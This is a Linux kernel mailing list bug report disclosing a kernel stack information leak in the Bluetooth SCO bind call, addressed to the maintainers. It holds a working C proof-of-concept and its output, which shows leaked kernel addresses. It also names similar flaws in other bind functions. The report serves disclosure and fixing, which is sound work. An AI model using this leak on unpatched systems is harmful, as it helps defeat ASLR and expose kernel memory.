From: Dmitry Vyukov <dvyukov@google.com>
Subject: Information leak in sco_sock_bind
Date: Tue, 15 Dec 2015 21:02:30 +0100
Message-ID: <CACT4Y+Zi9L5K3JExRLxuLS7FzjnQQth3b9ns-q6QufpyHOXf7Q@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
To: Marcel Holtmann <marcel@holtmann.org>,
	Gustavo Padovan <gustavo@padovan.org>,
	Johan Hedberg <johan.hedberg@gmail.com>,
	"David S. Miller" <davem@davemloft.net>,
	linux-bluetooth@vger.kernel.org, netdev <netdev@vger.kernel.org>,
	LKML <linux-kernel@vger.kernel.org>,
	syzkaller <syzkaller@googlegroups.com>,
	Kostya Serebryany <kcc@google.com>,
	Alexander Potapenko <glider@google.com>,
	Sasha Levin <sasha.levin@oracle.com>,
	Eric Dumazet <edumazet@google.com>,
	Kees Cook <keescook@google.com>,
	Hannes Frederic Sowa <hannes@stressinduktion.org>,
	Ursula Braun <ursula.braun@de.ibm.com>,
	linux-s390@vger.kernel.org,
	Lauro Ramos Venancio <lauro.venancio@openbossa.org>,
	Aloisio Almeida Jr <aloisio.almeida@openbossa.org>,
	Samuel Ortiz <sameo@linux.intel.com>
Return-path: <linux-kernel-owner@vger.kernel.org>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

Hello,

The following program leads to leak of 6 bytes from kernel stack:

#include <sys/types.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <linux/in6.h>
#include <linux/socket.h>
#include <linux/if.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

struct sockaddr_sco {
sa_family_t     sco_family;
char        sco_bdaddr[6];
};

#define BTPROTO_SCO 2

int main(void)
{
        struct sockaddr sa;
        struct sockaddr_sco sco_sa;
        unsigned len, i, try;
        int fd;

        for (try = 0; try < 3; try++) {
                fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO);
                if (fd == -1)
                        return;
                switch (try) {
                case 0:
                break;
                case 1:
                sched_yield();
                break;
                case 2:
                open("/dev/null", O_RDONLY);
                }
                memset(&sco_sa, 0, sizeof(sco_sa));
                sco_sa.sco_family = AF_BLUETOOTH;
                bind(fd, &sco_sa, 2);
                len = sizeof(sa);
                getsockname(fd, &sa, &len);
                for (i = 0; i < len; i++)
                        printf("%02x", ((unsigned char*)&sa)[i]);
                printf("\n");
        }
        return 0;
}

Output:
1f00333e0088ffff
1f00c13e0088ffff
1f002081ffffffff

The problem is that sco_sock_bind does not check sockaddr_len passed
in, so it copies stack garbage from stack into the socket. This can
defeat ASLR, leak crypto keys, etc.
We've just fixed a similar issue in pptp_bind. The similar issue is in
llcp_sock_bind and llcp_raw_sock_bind. And there seems to be the same
bug in iucv_sock_bind, it is S390 specific, so I can't test it.

Kees proposed to zero unused part of sockaddr in SyS_bind/SyS_connect,
or add addr size to proto struct to prevent all such existing and
future bugs.
